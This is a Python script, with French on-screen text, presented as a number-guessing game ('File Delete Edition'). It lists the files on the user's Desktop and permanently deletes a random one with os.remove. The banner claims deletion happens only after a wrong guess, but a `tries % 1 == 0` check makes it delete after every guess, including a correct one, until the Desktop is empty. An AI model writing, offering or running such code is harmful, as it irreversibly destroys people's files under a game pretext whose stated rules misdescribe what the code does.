import os
import random
from pystyle import Center
from pystyle import Anime, Colors, Colorate, System, Center, Write
from colorama import Fore
from colorama import Style

os.system("title What.TheNumber? File Delete Edition")

print()
print(
  Center.XCenter(
    Colorate.Horizontal(
      Colors.yellow_to_red,  """
░██╗░░░░░░░██╗██╗░░██╗░█████╗░████████╗░░░████████╗██╗░░██╗███████╗███╗░░██╗██╗░░░██╗███╗░░░███╗██████╗░███████╗██████╗░░█████╗░
░██║░░██╗░░██║██║░░██║██╔══██╗╚══██╔══╝░░░╚══██╔══╝██║░░██║██╔════╝████╗░██║██║░░░██║████╗░████║██╔══██╗██╔════╝██╔══██╗██╔══██╗
░╚██╗████╗██╔╝███████║███████║░░░██║░░░░░░░░░██║░░░███████║█████╗░░██╔██╗██║██║░░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝╚═╝███╔╝
░░████╔═████║░██╔══██║██╔══██║░░░██║░░░░░░░░░██║░░░██╔══██║██╔══╝░░██║╚████║██║░░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗░░░╚══╝░
░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║░░░██║░░░██╗░░░██║░░░██║░░██║███████╗██║░╚███║╚██████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║░░░██╗░░
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░
                          ▄▀ █▀▀ █ █░░ █▀▀   █▀▄ █▀▀ █░░ █▀▀ ▀█▀ █▀▀   █▀▀ █▀▄ █ ▀█▀ █ █▀█ █▄░█ ▀▄
                          ▀▄ █▀░ █ █▄▄ ██▄   █▄▀ ██▄ █▄▄ ██▄ ░█░ ██▄   ██▄ █▄▀ █ ░█░ █ █▄█ █░▀█ ▄▀
""", 1)))
print()
print(
  Center.XCenter(
    Colorate.Horizontal(
      Colors.yellow_to_red,  """
 ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║  Règles: Vous devez trouvé un nombre entre 1 et 10 000 qui a été généré par la bibliothèque "Random".     ║
 ║  Si vous donné un mauvais nombre, un fichier de votre bureau sera définitivement supprimé.                ║
 ║  Si vous donné le bon nombre, vous gagnez mais vous ne récupèrerez pas vos fichiers.                      ║
 ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════╝ \n \n \n \n \n \n \n \n 
""", 1)))


folder_path = os.path.join(os.path.expanduser("~"), "Desktop")
files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]

target = None
tries = 0
while files:
    if target is None:
        target = random.randint(1, 10000)
        guess = None
        Write.Print(" Entrez un nombre entre 1 et 10000 : ", Colors.yellow, interval=0.05)
    else:
        guess = int(input())
        tries += 1
        if guess < target:
            Write.Print("Trop petit ⬆️", Colors.red, interval=0.05)
        elif guess > target:
            Write.Print("Trop grand ⬇️", Colors.red, interval=0.05)
        else:
            Write.Print(f"Félicitations ! {target} était le bon chiffre, vous l'avez trouvé en {tries} essais", Colors.green, interval=0.05)
            Write.Input("", Colors.red_to_blue, interval=0.0025)
            target = None
            tries = 0
        if tries % 1 == 0:
            random_file = random.choice(files)
            file_path = os.path.join(folder_path, random_file)
            os.remove(file_path)
            Write.Print(f"\n{random_file}, a été supprimé.\n‎", Colors.orange, interval=0.01)
            files.remove(random_file)
else:
    Write.Print("Le dossier est vide. On peut dire que tu m'as bien eu ☹️\n‎ ", Colors.cyan, interval=0.05)
    Write.Input("", Colors.red_to_blue, interval=0.0025)
